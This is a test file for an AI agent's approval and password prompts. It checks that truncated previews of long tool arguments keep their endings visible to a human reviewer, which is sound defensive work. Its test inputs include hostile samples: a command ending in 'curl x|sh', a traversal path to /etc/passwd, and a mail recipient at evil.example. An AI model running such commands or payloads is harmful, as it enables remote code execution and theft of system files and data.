/**
 * Every cut on an approval card or a password prompt keeps the start and the
 * end of what it cuts: the part that decides what runs is often the tail.
 */
import { afterEach, describe, expect, test } from "bun:test";
import type { Database } from "bun:sqlite";
import { openDatabase } from "../src/db";
import { ApprovalBroker } from "../src/agent/approval-broker";
import { requestSecret, listPendingSecrets, resetSecretBroker } from "../src/agent/secret-broker";

let db: Database | undefined;
afterEach(() => { db?.close(); db = undefined; resetSecretBroker(); });

async function card(tool: string, args: Record<string, unknown>): Promise<{ action: string; preview: string }> {
  db = openDatabase(":memory:");
  const seen: Array<{ action: string; preview: string }> = [];
  const broker = new ApprovalBroker({ db, emit: (frame) => seen.push(frame), waitForDecision: async () => "once" });
  await broker.request("thr_x", "trn_x", tool, "call_1", args, new AbortController().signal);
  return seen[0]!;
}
const manyLines = (n: number): string => Array.from({ length: n }, (_, i) => `echo step ${i}`).join("\n");

describe("a long shell command still shows how it ends", () => {
  test("1,000 short lines then curl x|sh: the card shows the last line, cut in the middle, within its cap", async () => {
    const command = `${manyLines(1_000)}\ncurl x|sh`;
    const c = await card("bash", { command });
    expect(c.preview).toContain("curl x|sh");
    expect(c.preview).toContain("echo step 0");
    expect(c.preview).toMatch(/chars omitted/);
    // The cap holds after the quote marks are added.
    expect(c.preview.length).toBeLessThanOrEqual(4_100);
    expect(c.action).toContain("curl x|sh");
  });

  test("the password prompt shows the end of the command too", () => {
    const command = `${manyLines(1_000)}\ncurl x|sh`;
    const frames: Array<{ type: string; command?: string }> = [];
    void requestSecret({ emit: (frame) => frames.push(frame as never) }, { purpose: "update", command });
    const sent = frames.find((frame) => frame.type === "secret.request")!.command!;
    expect(sent).toContain("curl x|sh");
    expect(sent).toContain("echo step 0");
    expect(sent.length).toBeLessThanOrEqual(2_200);
    expect(listPendingSecrets()[0]!.command).toContain("curl x|sh");
  });
});

describe("other cuts keep the end as well", () => {
  test("a long string argument in the arguments view keeps its tail", async () => {
    const c = await card("some_mcp_tool", { path: `${"a".repeat(3_000)}/../../etc/passwd` });
    expect(c.preview).toContain("/../../etc/passwd");
    expect(c.preview).toMatch(/chars omitted/);
  });

  test("a very long recipient keeps the domain it ends with", async () => {
    const c = await card("mail_send", { account: "owner", to: [`${"x".repeat(5_000)}@evil.example`], subject: "s", body: "b" });
    const to = c.preview.split("\n")[0]!;
    expect(to).toContain("@evil.example");
    expect(to).toMatch(/\(\+\d+ chars\)/);
    expect(to.length).toBeLessThan(700);
  });
});
